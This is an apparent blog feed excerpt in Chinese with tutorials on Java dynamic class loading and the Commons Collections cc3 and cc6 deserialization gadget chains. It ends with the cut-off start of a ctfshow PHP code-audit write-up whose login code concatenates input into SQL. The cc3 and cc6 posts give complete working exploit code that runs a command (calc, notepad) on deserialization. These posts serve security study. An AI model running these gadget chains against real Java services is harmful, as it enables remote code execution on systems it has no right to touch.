class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//构造函数</span></span><br><span class="line">        System.out.println(<span class="string">&quot;无参person&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">staticAction</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,<span class="type">int</span> age)</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;有参person&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//对Serializable这个接口里的toString函数进行重写</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;,age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">action</span><span class="params">(String act)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(act);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//重新对readObject函数进行重写，然后在里面加一条命令执行的语句，这样的话就会在反序列化的时候就会执行，这样的话就会造成安全问题</span></span><br><span class="line">        ois.defaultReadObject();;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>); <span class="comment">//Runtime.getRuntime().exec 用于调用外部可执行程序或系统命令</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是相较于以前多了(下面的三个东西)</p><p><img src="../images/image-20230320165602512.png" alt="image-20230320165602512"></p><p>在new一个无参对象的时候</p><p><img src="../images/image-20230320165706358.png" alt="image-20230320165706358"></p><p>在new一个有参对象的时候</p><p><img src="../images/image-20230320165748935.png" alt="image-20230320165748935"></p><p>是一样的</p><p>都是先静态代码块——-&gt;   构造代码块    ——-&gt;  有(无)参方法</p><p><img src="../images/image-20230320170134879.png" alt="image-20230320170134879"></p><p>当调用类的方法的时候，就不会调用其他关于对象的方法</p><p><img src="../images/image-20230320170226755.png" alt="image-20230320170226755"></p><p>这三个就是和对象相关的，所以不会调用</p><p><img src="../images/image-20230320170355436.png" alt="image-20230320170355436"></p><p>在调用这个静态变量的时候也调用了这个静态代码块</p><p>在类加载的时候是不会进行任何方法或者变量的调用的</p><p><img src="../images/image-20230320171803411.png" alt="image-20230320171803411"></p><p>上面的方法都是写死的，不能进行动态加载，所以这里我们就用到了之前在反射里面用到的方法      <strong>forName</strong></p><p><img src="../images/image-20230320172620889.png" alt="image-20230320172620889"></p><p>就是这个方法进行了<strong>初始化</strong>的操作   (已知初始化操作会执行静态代码块)</p><p><img src="../images/image-20230320172703713.png" alt="image-20230320172703713"></p><p>然后跟进这个forName0的方法，这个方法是native写的，是c来写的</p><p><img src="../images/image-20230320175604207.png" alt="image-20230320175604207"></p><p>他里面有几个参数</p><p>第一个是传类名，第二个是判断是否初始化，第三个是类加载器，第四个不重要</p><p>因为forName里面默认的是否初始化是true，所以如果想让他不进行初始化的话，就传值，因为Class这个类里边还有另一个forName</p><p><img src="../images/image-20230320180218646.png" alt="image-20230320180218646"></p><p>因为ClassLoader是一个抽象类，不能实例化，但是他有个静态方法是可以实例化的</p><p><img src="../images/image-20230320180742675.png" alt="image-20230320180742675"></p><p>这里只传三个参数是因为forName只有三个参数，forName0才是有四个参数的</p><p>这样写就不能进行实例化和初始化了</p><p>我们可以利用反射里面学的newIntance()方法来进行实例化和初始化了</p><p><img src="../images/image-20230320183317612.png" alt="image-20230320183317612"></p><p><strong>上面大概介绍完就开始讲这个类加载器的东西了</strong></p><p><img src="../images/image-20230320184323015.png" alt="image-20230320184323015"></p><p>就是利用这个动态类加载来进行实例化对象(<strong>这里说明一下这个loadClass是不进行初始化的</strong>)</p><p><img src="../images/image-20230320184435751.png" alt="image-20230320184435751"></p><p>上面是简单的介绍，详细的看这篇文章      <a href="https://zhuanlan.zhihu.com/p/567962697">动态类加载</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;视频地址 &lt;a href=&quot;https://www.bilibili.com/video/BV16h411z7o9?p=4&amp;amp;vd_source=bacfffe46b930fda5761b63367eb298c&quot;&gt;动态类加载&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;</summary>
      
    
    
    
    
    <category term="java 动态类加载" scheme="https://ke1nys.github.io/tags/java-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化-cc3</title>
    <link href="https://ke1nys.github.io/posts/a68e45f7.html"/>
    <id>https://ke1nys.github.io/posts/a68e45f7.html</id>
    <published>2023-03-20T08:41:18.000Z</published>
    <updated>2023-04-06T06:48:36.153Z</updated>
    
    <content type="html"><![CDATA[<p>cc3这条链和前面的cc1和cc6是不同的，这个执行命令用的是<strong>动态类加载</strong></p><p>不是Runtime.getRuntime.exec()</p><p>所以说学这条链子之前得去学下啥是动态类加载</p><p> 因为动态类加载的时候会调用loadclass，然后loadclass最后就会调用到defineclass,然后因为最后调用的defineclass不是public的，所以我们得去找哪个类里边重写了这个函数，并且是public的</p><p><img src="../images/image-20230321221053484.png" alt="image-20230321221053484"></p><p>这个函数参数的找不到有重写然后是public的调用他</p><p>然后发现了这种类型的defineclass有函数调用</p><p><img src="../images/image-20230321221604507.png" alt="image-20230321221604507"></p><p>然后还是default类型的(这个类型说明了这个包里可以调用他)</p><p>然后我们跟进去，看谁调用了这个default的defineclass</p><p><img src="../images/image-20230321221849460.png" alt="image-20230321221849460"></p><p>在他自身类里边的这个函数调用了default方法，但是这个是private的，所以我们就继续找哪个public调用了他</p><p><img src="../images/image-20230321222150282.png" alt="image-20230321222150282"></p><p>然后找到了一个private方法里面有个实例化的方法，</p><p>所以我们就接着往下找，找哪个public方法里面调用了他</p><p><img src="../images/image-20230321222331758.png" alt="image-20230321222331758"></p><p>最后找到这个public就找完了</p><p>然后我们就得想想怎么控制这个实例化对象</p><p><img src="../images/image-20230322194209379.png" alt="image-20230322194209379"></p><p>然后看到上图就看到了defineTransletClasses()这个函数方法是可以赋值传参的</p><p><img src="../images/image-20230322194315725.png" alt="image-20230322194315725"></p><p>在满足上面的条件后就可以进行赋值了</p><p>通过上面的寻找，发现找的函数方法全在TemplatesImpI这个类里边，并且这个类还可以进行序列化，那么这个里面里边的参数我们就都可以进行控制了(反射)</p><p><img src="../images/image-20230322194840494.png" alt="image-20230322194840494"></p><p><strong>第一步的出发点</strong>，<strong>得用这个来触发defineClass</strong></p><p><img src="../images/image-20230322195037005.png" alt="image-20230322195037005"></p><p><img src="../images/image-20230322195128556.png" alt="image-20230322195128556"></p><p><img src="../images/image-20230322195140695.png" alt="image-20230322195140695"></p><p>这里话我们是想先去调用第二个if里边的函数方法，来给下面的实例化对象赋值</p><p>跟进这个函数后(就会发现有两个if必须满足，因为第一个如果不满足的话就会抛异常，第二个是因为得给他赋值让他调用函数方法)<strong>这里赋值的原因是因为这个TemplatesImpI类的构造函数没有进行赋值</strong></p><p><img src="../images/image-20230322195459426.png" alt="image-20230322195459426"></p><p>所以接下来我们开始进行赋值，先从getTransletInstance()这个函数开始，就是献给name赋值</p><p>然后再给_bytecodes赋值,因为就是不能让他抛异常(这里给bytecodes赋值是有讲究的)实例化时需要的类是由bytecodes赋值的，而且还由于最后的defineclass()函数，这里的话bytecodes的类型还是得进行限制的</p><p><img src="../images/image-20230322201130287.png" alt="image-20230322201130287"></p><p><img src="../images/image-20230322201336724.png" alt="image-20230322201336724"></p><p><img src="../images/image-20230322201345186.png" alt="image-20230322201345186"></p><p>最后写出来的成果</p><p>因为类里边的bytecodes是个二维数组，所以初始化的时候就先给他变为二维数组，然后因为得需要他的一维数组进行赋值，所以在嵌套一个一维数组</p><p>然后最后还有一个_tfactory没有进行赋值，所以我们就得对他进行赋值，不然会报错</p><p><img src="../images/image-20230322202030498.png" alt="image-20230322202030498"></p><p>这就是他的类型(然后这个参数是transient，就是不可以进行序列化的意思)</p><p>所以我们就猜它是在readObject里面进行赋值的</p><p><img src="../images/image-20230322202306042.png" alt="image-20230322202306042"></p><p>最下面就看到它了</p><p><img src="../images/image-20230322202519552.png" alt="image-20230322202519552"></p><p>赋值成功</p><p>然后运行发现没成功(发现在defineTransletClasses这个函数里边的下面那个参数为空，然后爆了空指针错误)</p><p><img src="../images/image-20230322203013541.png" alt="image-20230322203013541"></p><p>但是单休改这个参数没啥大的意义，因为transletIndex值为-1，到了下面的if判断还是会抛异常出错</p><p><img src="../images/image-20230322203529965.png" alt="image-20230322203529965"></p><p>所以我们就先得满足这个</p><p><img src="../images/image-20230322203759237.png" alt="image-20230322203759237"></p><p>让他的值不为-1，然后跟进去后发现</p><p><img src="../images/image-20230322203953283.png" alt="image-20230322203953283"></p><p>这里要求要和superClass里面的类相等，所以我们就得在弹计算器的类里边更改</p><p><strong>cc3完整代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">           <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">           <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">           <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">           field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           field.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">           <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">           field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://tmp/test.class&quot;</span>));</span><br><span class="line">           <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">           field1.set(templates,codes);</span><br><span class="line">           <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">           field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           field2.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">           templates.newTransformer();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>test.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;notepad&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面写的代码是对这条链子的一个基本解释，接下来我们用cc1里的方法来对上面的代码进行反序列化操作</p><p><img src="../images/image-20230322214845664.png" alt="image-20230322214845664"></p><p>然后我们再把cc1后面的代码拿过来</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;cc3这条链和前面的cc1和cc6是不同的，这个执行命令用的是&lt;strong&gt;动态类加载&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;不是Runtime.getRuntime.exec()&lt;/p&gt;
&lt;p&gt;所以说学这条链子之前得去学下啥是动态类加载&lt;/p&gt;
&lt;p&gt; 因为动态类加载的时候会</summary>
      
    
    
    
    
    <category term="java反序列化 cc3" scheme="https://ke1nys.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化-cc6</title>
    <link href="https://ke1nys.github.io/posts/d6e4b178.html"/>
    <id>https://ke1nys.github.io/posts/d6e4b178.html</id>
    <published>2023-03-19T11:01:21.000Z</published>
    <updated>2023-04-06T06:48:36.158Z</updated>
    
    <content type="html"><![CDATA[<p>由于jdk1.8_71以后对<code>AnnotationInvocationHandler</code>这个类进行了处理，然后就导致了cc1链用不了了，然后就诞生了个cc6的链子</p><p>就是修改了这个类里边的readObject方法</p><p><img src="../images/image-20230319193748245.png" alt="image-20230319193748245"></p><p>这就是链子的构造</p><p>不受jdk版本的影响，这里的话就直接跟着图片上的链子来走了</p><p>这里简单说一下就是这里的话是先HashMap里面的readObject方法，然后到调用到里面的hash方法，然后hash方法就会调用到hashcode方法，然后就接着下面写的就行</p><p>就是找到了这个类(TiedMapEntry)</p><p><img src="../images/image-20230319194451418.png" alt="image-20230319194451418"></p><p>然后找到这个类里边的hashcode方法，这个方法里面调用了getValue</p><p><img src="../images/image-20230319194615690.png" alt="image-20230319194615690"></p><p><img src="../images/image-20230319194625684.png" alt="image-20230319194625684"></p><p>然后getValue里面就会调用到get方法，然后map可控，可以传为Lazymap，然后后面的就和cc1一样了</p><p><img src="../images/image-20230319195615382.png" alt="image-20230319195615382"></p><p>这里就先把之前写的cc1的东西给复制过来</p><p><img src="../images/image-20230319200144657.png" alt="image-20230319200144657"></p><p>这里就先进行补充，这里利用put给hashmap里面赋值(hashmap构造函数不能赋值)，这里在序列化的时候会调用hashmap里的readObject方法，然后调用里面的hash方法，hash方法里面就会调用tiedMapEntry的hashcode方法，然后这个就会TiedMapEntry里面的getValue方法，然后在调用lazy.get方法，然后其他的就和cc1一样了</p><p>但是想法总是好的，这里有一个问题就是我们在put传值的时候，也调用了hash方法，导致在序列化的时候就弹了计算器(和URLDNS那条链类似)</p><p><strong>解决办法</strong></p><p><img src="../images/image-20230319201415245.png" alt="image-20230319201415245"></p><p>按照代码的顺序一行一行看下来，就是在put传参的时候把lazymap里面的值给修改掉，改成一个没啥用的值，然后让他不能执行，(简单点说就是把链子破坏)，然后下面再用反射给修改回来</p><p>但是这里还不行，这里还是和URLDNS那条链一个样子，就是会新建一个key的值，导致后面反序列化的时候进不来这个if，然后导致调用不到这个put</p><p>这个key是Lazymap类里边的</p><p><img src="../images/image-20230319202113261.png" alt="image-20230319202113261"></p><p><strong>解决办法</strong></p><p>就是把这个key给删了</p><p><img src="../images/image-20230319202354112.png" alt="image-20230319202354112"></p><p><strong>cc6.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.ws.policy.privateutil.PolicyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span> &#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">                &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap1.put(tiedMapEntry,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(lazyMap,chainedTransformer);</span><br><span class="line">        <span class="comment">//serialize(hashMap1);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的话要把debug时候的自动调用tostring方法给关掉，不然可能会不成功</p><p><strong>这里话是不限制jdk版本的，只对cc链的版本进行限制</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;由于jdk1.8_71以后对&lt;code&gt;AnnotationInvocationHandler&lt;/code&gt;这个类进行了处理，然后就导致了cc1链用不了了，然后就诞生了个cc6的链子&lt;/p&gt;
&lt;p&gt;就是修改了这个类里边的readObject方法&lt;/p&gt;
&lt;p&gt;&lt;img sr</summary>
      
    
    
    
    
    <category term="java反序列化 cc6" scheme="https://ke1nys.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc6/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-代码审计</title>
    <link href="https://ke1nys.github.io/posts/29301d9.html"/>
    <id>https://ke1nys.github.io/posts/29301d9.html</id>
    <published>2023-03-18T13:56:58.000Z</published>
    <updated>2023-04-06T06:48:36.148Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h2><p>题目(给了源码)</p><p><strong>checklogin.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line"><span class="variable">$userpwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select sds_password from sds_user where sds_username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; order by id limit 1;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span 